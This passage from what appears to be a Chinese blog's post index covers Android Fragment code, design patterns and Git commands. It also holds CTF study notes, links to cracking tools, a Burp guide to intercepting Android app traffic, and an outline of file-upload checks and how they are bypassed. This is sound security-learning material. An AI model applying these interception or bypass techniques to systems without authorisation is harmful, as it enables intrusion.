LayoutInflater.from(getApplicationContext());\n\t\t\t\t\t}\n\t\t\t\t\tlayout = new FrameLayout(layoutInflater.getContext());\n\t\t\t\t\tView view = getPreviewLayout(layoutInflater, layout);\n\t\t\t\t\tif (view != null) {\n\t\t\t\t\t\tlayout.addView(view);\n\t\t\t\t\t}\n\t\t\t\t\tlayout.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT));\n\t\t\t\t\tsuper.setContentView(layout);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tisInit = true;\n\t\t\t\tonCreateViewLazy(savedInstanceState);\n\t\t\t}\n\t\t}\n\n\t\tprivate int isVisibleToUserState = VISIBLE_STATE_NOTSET;\n\t\t//未设置值\n\t\tprivate static final int VISIBLE_STATE_NOTSET = -1;\n\t\t//可见\n\t\tprivate static final int VISIBLE_STATE_VISIABLE = 1;\n\t\t//不可见\n\t\tprivate static final int VISIBLE_STATE_GONE = 0;\n\n\t\t@Override\n\t\tpublic void setUserVisibleHint(boolean isVisibleToUser) {\n\t\t\tsuper.setUserVisibleHint(isVisibleToUser);\n\t\t\tisVisibleToUserState = isVisibleToUser ? VISIBLE_STATE_VISIABLE : VISIBLE_STATE_GONE;\n\t\t\tif (isVisibleToUser && !isInit && getContentView() != null) {\n\t\t\t\tisInit = true;\n\t\t\t\tonCreateViewLazy(savedInstanceState);\n\t\t\t\tonResumeLazy();\n\t\t\t}\n\t\t\tif (isInit && getContentView() != null) {\n\t\t\t\tif (isVisibleToUser) {\n\t\t\t\t\tisStart = true;\n\t\t\t\t\tonFragmentStartLazy();\n\t\t\t\t} else {\n\t\t\t\t\tisStart = false;\n\t\t\t\t\tonFragmentStopLazy();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprotected View getPreviewLayout(LayoutInflater inflater, ViewGroup container) {\n\t\t\treturn null;\n\t\t}\n\n\t\t@Deprecated\n\t\t@Override\n\t\tpublic final void onStart() {\n\t\t\tsuper.onStart();\n\t\t\tif (isInit && !isStart && getUserVisibleHint()) {\n\t\t\t\tisStart = true;\n\t\t\t\tonFragmentStartLazy();\n\t\t\t}\n\t\t}\n\n\t\t@Deprecated\n\t\t@Override\n\t\tpublic final void onStop() {\n\t\t\tsuper.onStop();\n\t\t\tif (isInit && isStart && getUserVisibleHint()) {\n\t\t\t\tisStart = false;\n\t\t\t\tonFragmentStopLazy();\n\t\t\t}\n\t\t}\n\n\t\tprivate boolean isStart = false;\n\n\t\tprotected void onFragmentStartLazy() {\n\n\t\t}\n\n\t\tprotected void onFragmentStopLazy() {\n\n\t\t}\n\n\t\tprotected void onCreateViewLazy(Bundle savedInstanceState) {\n\n\t\t}\n\n\t\tprotected void onResumeLazy() {\n\n\t\t}\n\n\t\tprotected void onPauseLazy() {\n\n\t\t}\n\n\t\tprotected void onDestroyViewLazy() {\n\n\t\t}\n\n\t\t@Override\n\t\tpublic void setContentView(int layoutResID) {\n\t\t\tif (isLazyLoad && getContentView() != null && getContentView().getParent() != null) {\n\t\t\t\tlayout.removeAllViews();\n\t\t\t\tView view = inflater.inflate(layoutResID, layout, false);\n\t\t\t\tlayout.addView(view);\n\t\t\t} else {\n\t\t\t\tsuper.setContentView(layoutResID);\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\tpublic void setContentView(View view) {\n\t\t\tif (isLazyLoad && getContentView() != null && getContentView().getParent() != null) {\n\t\t\t\tlayout.removeAllViews();\n\t\t\t\tlayout.addView(view);\n\t\t\t} else {\n\t\t\t\tsuper.setContentView(view);\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\t@Deprecated\n\t\tpublic final void onResume() {\n\t\t\tsuper.onResume();\n\t\t\tif (isInit) {\n\t\t\t\tonResumeLazy();\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\t@Deprecated\n\t\tpublic final void onPause() {\n\t\t\tsuper.onPause();\n\t\t\tif (isInit) {\n\t\t\t\tonPauseLazy();\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\t@Deprecated\n\t\tpublic final void onDestroyView() {\n\t\t\tsuper.onDestroyView();\n\t\t\tif (isInit) {\n\t\t\t\tonDestroyViewLazy();\n\t\t\t}\n\t\t\tisInit = false;\n\t\t}\n\t}\n\n\n\n\timport java.lang.reflect.Field;\n\n\timport android.content.Context;\n\timport android.os.Bundle;\n\timport android.support.v4.app.Fragment;\n\timport android.view.LayoutInflater;\n\timport android.view.View;\n\timport android.view.ViewGroup;\n\n\tpublic class BaseFragment extends Fragment {\n\t\tprotected LayoutInflater inflater;\n\t\tprivate View contentView;\n\t\tprivate Context context;\n\t\tprivate ViewGroup container;\n\n\t\t@Override\n\t\tpublic void onCreate(Bundle savedInstanceState) {\n\t\t\tsuper.onCreate(savedInstanceState);\n\t\t\tcontext = getActivity().getApplicationContext();\n\t\t}\n\n\t\t@Override\n\t\tpublic final View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {\n\t\t\tthis.inflater = inflater;\n\t\t\tthis.container = container;\n\t\t\tonCreateView(savedInstanceState);\n\t\t\tif (contentView == null)\n\t\t\t\treturn super.onCreateView(inflater, container, savedInstanceState);\n\t\t\treturn contentView;\n\t\t}\n\n\t\tprotected void onCreateView(Bundle savedInstanceState) {\n\n\t\t}\n\n\t\t@Override\n\t\tpublic void onDestroyView() {\n\t\t\tsuper.onDestroyView();\n\t\t\tcontentView = null;\n\t\t\tcontainer = null;\n\t\t\tinflater = null;\n\t\t}\n\n\t\tpublic Context getApplicationContext() {\n\t\t\treturn context;\n\t\t}\n\n\t\tpublic void setContentView(int layoutResID) {\n\t\t\tsetContentView((ViewGroup) inflater.inflate(layoutResID, container, false));\n\t\t}\n\n\t\tpublic void setContentView(View view) {\n\t\t\tcontentView = view;\n\t\t}\n\n\t\tpublic View getContentView() {\n\t\t\treturn contentView;\n\t\t}\n\n\t\tpublic View findViewById(int id) {\n\t\t\tif (contentView != null)\n\t\t\t\treturn contentView.findViewById(id);\n\t\t\treturn null;\n\t\t}\n\n\t\t// http://stackoverflow.com/questions/15207305/getting-the-error-java-lang-illegalstateexception-activity-has-been-destroyed\n\t\t@Override\n\t\tpublic void onDetach() {\n\t\t\tsuper.onDetach();\n\t\t\ttry {\n\t\t\t\tField childFragmentManager = Fragment.class.getDeclaredField(\"mChildFragmentManager\");\n\t\t\t\tchildFragmentManager.setAccessible(true);\n\t\t\t\tchildFragmentManager.set(this, null);\n\n\t\t\t} catch (NoSuchFieldException e) {\n\t\t\t\tthrow new RuntimeException(e);\n\t\t\t} catch (IllegalAccessException e) {\n\t\t\t\tthrow new RuntimeException(e);\n\t\t\t}\n\t\t}\n\n\t}\n\n\n使用方法\n\n\n\tpublic class ListFragment extends LazyFragment {\n\n\t\t@Override\n\t\tprotected void onCreateViewLazy(Bundle savedInstanceState) {\n\t\t\tsuper.onCreateViewLazy(savedInstanceState);\n\t\t\t// 在这里进行初始化控件 findViewById\n\t\t}\n\n\t\t@Override\n\t\tprotected void onResumeLazy() {\n\t\t\tsuper.onResumeLazy();\n\t\t\t// 在这里加载数据\n\t\t}\n\n\t\t@Override\n\t\tprotected void onDestroyViewLazy() {\n\t\t\tsuper.onDestroyViewLazy();\n\t\t\t// 在这里进行对象的释放\n\t\t}\n\t}\n\n","tags":["android"],"categories":["android"]},{"title":"设计模式-策略模式（strategy）","url":"/post/2113223531.html","content":"\n## 策略模式\n\n视频地址  \nhttp://www.imooc.com/video/3213\n\n策略模式  ：  \n\n将可变的部分  从程序中抽象分离成算法接口在该接口下分别封装一系列的算法实现\n并使他们可以相互等候，从而导致客户端程序独立于算法的改变。  \n \n不变更代码架构  \n通过开发与重构  \n拥抱需求的变化  \n使用策略模式  \n\n虚拟应用：  鸭子应用  \n飞行的能力    \n更多鸭子类型  \n每六个月发布一款产品  \n\n原有功能  \n\n鸭子的鸣叫功能  \n鸭子的显示功能  \n\n需求：  \n加入飞行能力  \n\n原有项目：  \n鸭子基类  \nDuck.class\n\n\t/*\n\t * 超类，所有的鸭子都要继承此类\n\t * 抽象了鸭子的行为：显示和鸣叫\n\t */\n\tpublic abstract class Duck {\n\t  \n\t\t/*\n\t\t * 鸭子发出叫声\n\t\t * 通用行为，由超类实现\n\t\t */\n\t\tpublic void quack(){\n\t\t\tSystem.out.println(\"嘎嘎嘎\");\n\t\t}\n\t\t\n\t\t/*\n\t\t * 显示鸭子的外观\n\t\t * 鸭子的外观各不相同，声明为abstract， 由子类实现\n\t\t */\n\t\tpublic abstract void display();\n\t\t\n\t\t\t\n\t}\n\n需求:让鸭子飞起来？  \n\n\n方案一：继承  \n    在父类中提供实现方法，子类通过继承获得父类中的飞行行为  \n    \n    Duck.class\n\n\tpublic void fly(){\n\t\tSystem.out.println(\"用翅膀飞行\");\n\t}\n\n\n优点  \n  简单易用(粗暴丑陋)，已用应用可以快速添加飞行的能力  \n缺点  \n  不具有灵活性，对未来变更支持差  \n  需要通过在子类中覆写飞行的方法以提供新的飞行行为。这很容易造成错误(粗心的程序员忘记覆写)。  \n\n-----------------------------------pass----------------------------------  \n\n方案二：抽象方法  \n  在父类中提供抽象方法，强迫子类实现自己的飞行行为  \n\n\tpublic abstract void fly();\n\n优点  \n  足够灵活。  \n\n缺点  \n  累死  \n  每个子类都要实现一遍代码，即使是相同的行为也不例外。  \n  代码重复，没有复用代码。  \n\n-------------------------pass-------------------------------------  \n\n######继承是重用代码的利器  \n######但继承并不总是最好的工具  \n\n***\n\n#####复合优先于继承\n#####多用组合，少用继承\n\n组合  \nhas-a     \n#use  \n\n组合：  \n 在类中增加一个私有域，引用另一个已有的类的实例，通过调用引用实例的方法从而获得新的功能，这种设计称作组合(复合)  \n\n\n方案三：组合  \n  将飞行行为抽象为接口，在父类中持有该接口，并由该接口代理飞行行为。  \n\n\t/*\n\t * 策略接口，实现鸭子的飞行行为\n\t */\n\tpublic interface FlyingStragety {\n\n\t\tvoid performFly();\n\t}\n\n\tprivate FlyingStragety flyingStragety;\n\n\n\tpublic void setFlyingStragety(FlyingStragety flyingStragety) {\n\t\tthis.flyingStragety = flyingStragety;\n\t}\n\n\tpublic void fly(){\n\t\tflyingStragety.performFly();\n\t}\n\n优点：  \n  足够灵活  \n  复用代码，更易于维护  \n\n缺点：  \n  \n\n\n策略模式中的设计原则：  \n  找出应用中需要变化的部分，把他们独立出来，不要和那些不需要变化的代码混在一起。  \n  面向接口编程，而不是面向实现编程。  \n  多用组合，少用继承。  \n\n策略模式的实现：  \n  （1） 通过分离变化得出的策略接口Strategy  \n  （2） Strategy的实现类  \n  （3） 客户程序\"有一个\"Stategy  \n  （4） 客户程序中选择/组装正确的Strategy实现  \n","tags":["设计模式"],"categories":["设计模式"]},{"title":"Git命令行基础","url":"/post/744454998.html","content":"\n## Git命令行基础\n\nGit是一个开源的分布式版本控制工具  \n\n## 配置身份\n\n![配置身份](http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\tgit config --global user.name \"Tony\"\n\tgit config --global user.email \"tony@gmail.com\"\n\n\n## 检查是否配置成功\n\n![检查配置](http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\tgit config --global user.name \n\tgit config --global user.email\n\n## 创建本地代码仓库\n\n![创建本地仓库](http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\tgit init\n\n\n仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的  \n如果你想要删除本地仓库 只需要删除这个文件夹就行  \n\n![git](http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## 提交本地代码\n\n\tgit add [提交的文件名] // 提交一个文件 \n\n\tgit add . // 提交所有文件\n\n![git add](http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![git add .](http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n现在所有文件都加好了  然后用commit命令提交下  \n\n\tgit commit -m \"First commit.\"\n\n\n## 忽略文件\n\n在项目中创建  .gitignore 文件  \n\n在.gitignore文件下 每行指定的文件或目录会排除在版本控制外\n\n![.gitignore](http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n## 查看修改内容\n\n\tgit status\n\n\n![git status](http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## 查看更改内容\n\n\tgit diff\n\n![git diff](http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n## 撤销未提交的修改\n\n\tgit checkout\n\n## 撤回提交\n\n\tgit reset\n\n\n## 查看提交记录\n\n\tgit log\n\n![git log](http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n查看修改一行  \n\n\tgit log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1\n\n查看具体修改内容  \n\n\tgit log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p\n\n\n##查看分支  \n\n\tgit branch\t\n\n![git branch](http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## 建立分支\n\n\tgit branch version1.0\n\n## 切换分支\n\n\tgit checkout version1.0\n\n## 合并分支\n\n\tgit checkout master\n\tgit merge version1.0\n\n## 删除分支\n\n\tgit branch -D version1.0\n\n\n## 与远程版本库协作\n\n\tgit clone https://github.com/example/text.git\n\n## 本地修改内容同步到远程版本库  \n\n\tgit push origin master\n\n## 远程版本库修改同步到本地  \n\n\tgit fetch origin master\n\t\n## 查看远程版本库修改了那些东西\n\n\tgit diff origin/master\n\t\n之后在调用merge命令将origin/master分支上的修改合并到主分支上  \n\n\tgit merge origin/master\n\t\npull命令是相当于 fetch和merge两个命令放在一起执行  \n\n\tgit pull origon master\n\n---\n\n## 查看已存放：（这个最有用）\n\n\tgit ls-files\n\n## 查看还没添加的文件：\n\n\tgit status\n\n\n","tags":["git"],"categories":["git"]},{"title":"一些ctf的链接","url":"/post/912287952.html","content":"\n忘了什么时候整理了！！！  \n\n[ctfwiki](https://ctf-wiki.github.io/ctf-wiki/)  \n\n工具：  \n\n[看雪CTF工具](https://tools.pediy.com/win/debuggers.htm)  \n\n*****************************\n\nbrainfuck  \n\nfuckjs  \n\nWriteup  \nhttp://bobao.360.cn/ctf/detail/173.html  \nhttp://www.freebuf.com/articles/web/94444.html  \n\n\nzip  \nhttp://bobao.360.cn/ctf/detail/203.html  \n\ncap  \nhttp://www.jianshu.com/p/d4da13258f35  \n\ncap  \nhttp://blog.csdn.net/helloc0de/article/details/68956222  \nhttp://blog.csdn.net/sinat_34200786/article/details/76099974  \n\n\nhttps://www.secpulse.com/archives/38544.html  \nhttp://bobao.360.cn/ctf/learning/136.html  \n\n音速猴子  \nhttp://47.93.205.124:8001/  \n\n\n---------------------------------------------------------------\n\n工具  \nhttps://www.ctftools.com/  \nhttp://www.bugku.com/  \n\n博客  \nhttps://blog.ctftools.com/  \nhttp://www.cnblogs.com/xuanhun/  \n阮一峰的网络日志  \nhttp://www.ruanyifeng.com/blog/  \n\n编码  \nhttp://www.cnblogs.com/daban/p/5680451.html  \n\n有个练习平台  \nhttp://blog.csdn.net/helloc0de/article/details/68956222  \n\n密码学  \nhttp://blog.csdn.net/aldnoah_zero/article/details/52494982  \nhttp://blog.csdn.net/youzen_ing/article/details/73075180  \nhttp://www.am0s.com/ctf/179.html  \nhttp://bobao.360.cn/ctf/learning/136.html  \n\n---------------------------------------------------------------------\n\nhttps://trailofbits.github.io/ctf/    --介绍  \n\nhttps://ctftime.org/ --ctf竞赛时间  \n\nhttps://time.xctf.org.cn/ctfs/  --X-ctf  \n\nhttp://ctf.sobug.com/Steganography.php --SSCTF    --四叶草  \n\nhttps://bctf.cn/#/about   --百度ctf  \n\nhttp://www.hackdog.me/writeup/   --redrain大大  \n\nhttps://www.cyberchallenge.com.au/solutions.html  --国外站点  \n\nhttp://www.alictf.com/      --阿里ctf  \n\n**********************************************************\n\nhttp://oj.xctf.org.cn/    --X-ctf题目汇总  \n\nhttp://hackinglab.cn/\t --网络信息安全攻防学习平台  \n\nhttp://hackgame.blackbap.org/    --习科  \n\nhttp://www.honyaedu.com/    -红亚  \n\nhttp://www.wechall.net/    --ctf外国站点  \n\nhttp://ctf.idf.cn/   --IDF实验室  \n\nhttp://ctf.3sec.cn/    --Jlu.CTF  \n\nhttp://erange.heetian.com/CTFrace.html    --合天  \n\nhttp://www.simplexue.com/    --西普学院  \n\nhttp://1111.segmentfault.com/    --光棍节程序员闯关秀  \n\nhttp://www.helloisa.com/  --一个游戏又友链了几个游戏  \n\nhttps://redtiger.labs.overthewire.org/  --外国站点web_sql  \n\n**********************************************************\n\nhttps://github.com/ctfs/   --git上writeup  \n\nhttp://bobao.360.cn/ctf/   --360安全播报  \n\nhttp://sec.yka.me/  --英文版writeup  \n\nhttp://bobao.360.cn/ctf/learning/129.html  --DUTCTF-2015-Writeup  \n\nhttp://ctf.idf.cn/index.php?g=portal&m=list&a=index&id=10  --writeup  \n\nhttps://ctf-team.vulnhub.com/  --国外wp  \n\nhttps://www.91ri.org/9482.html  --91ri  \n\nhttp://zhuanlan.zhihu.com/wooyun/19861125 --wooyun_writeup  \n\nhttp://drops.wooyun.org/?s=writeup&submit=%E6%90%9C%E7%B4%A2 --wooyun  \n\n**********************************************************\n\nhttp://attach.blackbap.org/down/  --习科工具下载  \n\nhttp://forum.cnsec.org/thread-93930-1-1.html  --ctf_tools  \n\nhttp://mdsec.net/wahh/tools.html    --tool下载  \n\nhttp://tool.lu/  --在线工具集合  \n\nhttp://m.blog.csdn.net/blog/winkar/42458273  --一部分  \n\nhttp://www.ibeast.com/content/tools/ciscopassword/  --passwd_break  \n\nhttp://www.yellowpipe.com/yis/tools/encrypter/index.php  --编码解码  \n\nhttp://www.jsfuck.com/    --js_fuck  \n\nhttp://www.objectif-securite.ch/ophcrack.php    --hash破解  \n\n**********************************************************\nhttp://217.logdown.com/    --217  \n\nhttp://www.blue-lotus.net    --blue-lotus蓝莲花  \n\nhttp://blog.0ops.net/    --0ops  \n\nhttp://le4f.net/   --le4f大牛博客  \n\nhttp://www.programlife.net/    --代码疯子  \n\nhttp://appleu0.sinaapp.com/    --apple牛  \n\nhttp://www.syjzwjj.com/  --俊杰  \n\nhttp://blog.sycsec.com/  --三叶草  \n\nhttp://www.waitalone.cn/    --独自等待  \n\n\n--------------------------------------------------------------------\n反编译工具  \n\nandroid反编译工具 https://down.52pojie.cn/Tools/Android_Tools/  \n\napk反编译实战  \nhttp://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89%E7%88%B1%E5%8A%A0%E5%AF%86%E5%AE%B6%E7%9A%84%E5%A3%B3/  \n","tags":["ctf"],"categories":["ctf"]},{"title":"Burp抓Android的包","url":"/post/1340440380.html","content":"\n# Burp抓Android的包\n\n\n## 设置ip\n设置-网络-查看ip地址  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/01.png)\nburp-设置ip  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/02.png)\n\n手机  \n\n电脑要跟手机连同一个wifi  \nwifi-修改网络  \nwifi密码钥匙串  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/03.png)\n\n火狐浏览器配置  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/04.png)\n\n## 安装证书  \n设置浏览器代理  \n火狐浏览器-首选项-网络代理-设置  \n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/05.png)\n然后访问  \nhttp://127.0.0.1:8080/  \n下载证书  \n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/06.jpg)\n保存文件\n把后缀名修改成cer\n\n手机-设置-高级设置-安全-从SD卡安装\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/07.png)\n我是用qq传的\ntencent-QQfile_recv-cacert.cer\n\n\tadb push cacert.der /sdcard\n\n然后输入手机密码\n为证书命名\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/17/08.png)\n\n## Links\n[Burpsuite抓手机APP包并简要分析](https://blog.csdn.net/whstylist/article/details/78178161)  ","tags":["android安全","android逆向"],"categories":["android逆向"]},{"title":"CTF入门如何学习","url":"/post/3004991132.html","content":"\n这是看了i春秋课程的学习笔记  \n[CTF入门如何学习](https://www.ichunqiu.com/course/57515)\n\n## CTF对我们的意义-CTF类型\n\n**CTF题目的类型**  \n1.Web  \n2.Crypto  \n3.PWN  \n4.Misc  \n\n\t1.stego  \n\t2.forendics  \n\t3.等等  \n\n5.Reverse  \nPPC(Professionally ProgramCoder)  \n\n\n## 著名的CTF比赛\n\n-国际比赛：DEFCON资格赛  \n\n\tDEF CON CTF 2015  \n\tHITCON CTF  \n\tRuCTFE  \n\tSECCON CTF  \n\t32C3 CTF  \n\tBoston Key Party  \n\tPlaidCTF  \n\t0CTF  \n\tDEF CON CTF 2016 Qualifiers  \n\tDARPA Cyber Grand Challenge  \n\n-国内比赛：XCTF联赛  \n\n\tRCTF福州站  \n\tZCTF郑州站  \n\tSSCTF西安站  \n\tBCTF北京站  \n\t0CTF上海站  \n\tSCTF成都站  \n\tWHCTF武汉站  \n\tAliCTF杭州站  \n\tXCTF总决赛  \n\n## 为什么要打CTF\n\n能力提升  \n\n\t**思维能力**  \n\t**快速学习能力**  \n\t技术能力  \n\n发展前景  \n\n\t信息安全稀缺资源  \n\n\n## 需要哪些基础\n\n1.编程语言基础（c语言、汇编语言、脚本语言）  \n2.数学基础（算法、密码学）  \n3.脑洞大开（天马行空的想象、推理解密）  \n4.体力脑力（各种通宵熬夜不睡觉）  \n\n## 如何入门-如何学？\n\n1.恶补基础知识  \n2.尝试从脑洞开始（hackgame）  \n3.从基础题目出发  \n4.学习信息安全专业知识  \n5.锻炼体力耐力  \n\n## 如何入门-学之前的思考\n\n**我们到底要如何学习呢？**  \n1.分析赛题情况  \n2.分析自身能力  \n3.选择更适合的入手  \n\n## 如何入门-学之前的思考：分析赛题情况\n\nPWN、Reverse偏重对**汇编**、**逆向**的理解  \nCrpto偏重**数学**、**算法**的深入学习  \nWeb偏重对**技巧沉淀**、**快速搜索能力**的挑战  \nMisc则更为复杂，所有与**计算机安全挑战有关**的都算在其中  \n\n## 如何入门-学之前的思考：分析自身能力（兴趣）\n\n常规做法：  \nA方向：PWN+Reverse+Crypto随机搭配  \nB方向：Web+Misc组合  \n其实这里Misc所有人都能做  \n\n## 如何入门-恶补基础知识&信息安全专业知识\n\n都需要学的内容：  \nLinux基础、计算机组成原理、操作系统原理、网络协议分析  \n\nA方向：  \nIDA工具使用（f5组件）、逆向工程、密码学、缓冲区溢出等  \n\nB方向：  \n网络安全、内网渗透、数据库安全等  \n\n## 如何入门-恶补基础知识&信息安全专业知识\n\n推荐图书：（基础书籍按照自己喜欢的看）  \n\nA方向：  \nRE for Beginners（逆向工程入门）  \nIDA Pro权威指南  \n揭秘家庭路由器0day漏洞挖掘技术  \n自己动手写操作系统  \n黑客攻防技术宝典：系统实战篇  \n\nB方向：  \nWeb应用安全权威指南  \nWeb前端黑客技术揭秘  \n黑客秘籍-渗透测试实用指南  \n黑客攻防技术宝典 Web实战篇  \n代码审计：企业级Web代码安全架构  \n\n## 如何入门-从基础题目出发\n\n从基础题目出发（推荐资源）  \n\n[Idf实验室：题目非常基础](http://ctf.idf.cn/)  \n\n[i春秋有线下决赛题目复现，未来还会有更多精选比赛复现。](www.ichunqiu.com)  \n\n[xctf题库网站](http://oj.xctf.org.cn/)  \n\n[非常入门的国外ctf题库，很多国内选手都是从这里刷题成长起来。](www.wcchall.net/challs)  \n\n[非常入门的国外ctf题库](http://canyouhack.it/)  \n\n[很酷炫游戏化（A方向）](https://microcorruption.com/login)  \n\n[比较简洁的内容，SSH连入即可开始玩（A方向）](http://smashthestack.org)  \n\n比较老牌的Wargame，国内资料也比较多，一些[writeup](http://drops.wooyun.org/author/litao3rd) (A方向)  \n[overthewire](http://overthewire.org/wargames/)  \n\n也是一个比较老的Wargame，国内资料也比较多。（A方向）  \n[exploit-exercises](https://exploit-exercises.com/)  \n\nPWN类题目的游乐场（A方向）  \n[pwnable](http://pwnable,kr/play.php)  \n\n米安的Web漏洞靶场，还挺好玩（B方向）  \n[moomsos](http://ctf.moomsos.com/pentest/index.php)  \n\n[国外的xss测试（B方向）](http://prompt.ml/0)  \n\n[国外的SQL注入的挑战网站（B方向）](http://redtiger.labs.overthewire.org)  \n\n\n## 如何入门-选择什么工具\n\nCTF比赛一般都是使用网络安全常用工具，比如burp、IDA等，但是会有很多大家不常见的工具。  \n\n[truongkma-ctf-tools](https://github.com/truongkma/ctf-tools)  \n\n[v0lt](https://github.com/Plkachu/v0lt)  \n\n[zardus-ctf-tools](https://github.com/zardus/ctf-tools)  \n\n[TUCTF-Tools](https://github.com/TUCTF/Tools)  \n\n\n## 如何入门-以练促赛、以赛养练\n\n以练促赛：  \n选择一场已经存在Writeup的比赛  \n\n以赛养练：  \n参加一场最新CTF比赛  \n\n[国际比赛](https://ctftime.org/)  \n[国内比赛](http://www.xctf.org.cn/)  \n\n## 如何组建团队-强力成员画像\n\n1.思维跳跃：灵活性、不会钻墙角  \n2.专注：遇到问题不放弃直到解决  \n3.耐力：可以一天一夜不睡觉的研究技术  \n4.团队精神：责任、凝聚、分享  \n\n\n**有以上三条为强力成员；有以上四条会成为强力队长！**  \n\n\n## 如何组建团队-组建团队要解决的问题\n\n1.新人招募：如何评判新人潜力  \n2.队员培养：如何快速培养队伍能力  \n3.梯队有序：如何建立阶梯层级  \n4.纪律严格：如何拒绝无团队精神的队员  \n\n\n## 相关链接\n[网络安全学习资料](https://findneo.github.io/180308NewbieSecurityList/)\n","tags":["ctf"],"categories":["ctf"]},{"title":"mac_终端用sublime打开文件","url":"/post/576883658.html","content":"\n**打开文件**\n\t\n\tvi ~/.bash_profile\n\n**添加命令**\n\n\talias subl=\\''/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl'\\'\n\n**启动**\n\t\n\tsource ~/.bash_profile \n\n**使用命令**\n\n\tsubl 文件/目录\n\n\tsubl ./_posts/2018-08-03-mac_sublime_open_file.md\n\n\n## 参考链接\n[终端用sublime打开文件的方法](https://blog.csdn.net/u011240016/article/details/54434923)","tags":["macos"],"categories":["macos"]},{"title":"2.1.1-文件上传流动原理与流程-上传检测流程","url":"/post/2419343777.html","content":"\n## 文件上传检测流程\n\n![文件上传检测流程](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/15/01.png)\n\n**前端提交：**  \njavaScript检测、Flash AS检测  \napp：java代码检测  \n\n**数据传输：**  \n形成的报文到后端处理 -> 会存在WAF拦截、IPS入侵防御拦截  \n\n**后端处理：**  \n文件扩展名检测、MIME TYPE检测（报文文件参数content type）、文件格式检测、内容检测（检测恶意代码）  \n\n**写入文件系统：**  \n文件重命名、强制改变后缀名为jpg、杀毒软件查杀（隔离区或删除、00截断） \n\n**访问文件：**  \n无执行权限（直接返回文件内容）、未知位置（根据特殊名或id读取文件）  \n","tags":["web安全","文件上传漏洞"],"categories":["web安全"]},{"title":"blog链接","url":"/post/1065774692.html","content":"\n\n[wikimoe_live2d](https://www.wikimoe.com/)  \n[Live2D看板娘来了！typecho插件](https://qqdie.com/archives/l2d233.html)  \n[给博客添加能动的看板娘(Live2D)-将其添加到网页上吧](https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02)  \n[emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】](https://www.wikimoe.com/?post=75)  \n[博客通用版Live2d伊斯特瓦尔发布](https://www.wikimoe.com/?post=76)  \n\n[一言](https://xiaolin.in/read/hitokoto-api-xiaolin-edition.html)  \n\n","tags":["link"],"categories":["blog"]},{"title":"git切换远程分支命令","url":"/post/1524903793.html","content":"\n1.克隆项目  \n\n\tgit clone <项目链接>\n\n2.进入项目  \n\n\tcd work\n\n3.列出所有分支  \n\t\n\tgit branch -a\n\n输出  \n\n\tremotes/origin/dev\n\tremotes/origin/release\n\n4.切换远程开发分支  \n\n\tgit checkout -b dev origin/dev\n\n\t切换远程分支origin/dev\n\n5.切换远程正式分支  \n\n\tgit checkout -b release origin/release\n\n6.切换回本地dev分支，开始开发  \n\n\tgit checkout dev\n\n## git图形化工具\n\n[GitHub Desktop](https://desktop.github.com/)  \n\n[Sourcetree](https://www.sourcetreeapp.com/)墙裂推荐！！！超好用  \n\n## 相关链接\n\n[git 切换远程分支](https://www.cnblogs.com/libertycode/p/5858450.html)  \n[Git常用命令大全，迅速提升你的Git水平](http://www.jqhtml.com/8235.html)\n","tags":["git","branch"],"categories":["git"]},{"title":"2.1.1-文件上传流动原理与流程-文件上传漏洞原理","url":"/post/912983995.html","content":"\n## 上传&上传漏洞&上传检测流程\n\n**什么是文件上传**  \n\n> 文件上传是一个网站的常见功能，多用于上传照片、视频、文档等许多类型文件。\n\n**上传文件流程**  \n\n1.前端选择文件，进行提交。（浏览器端点击上传）  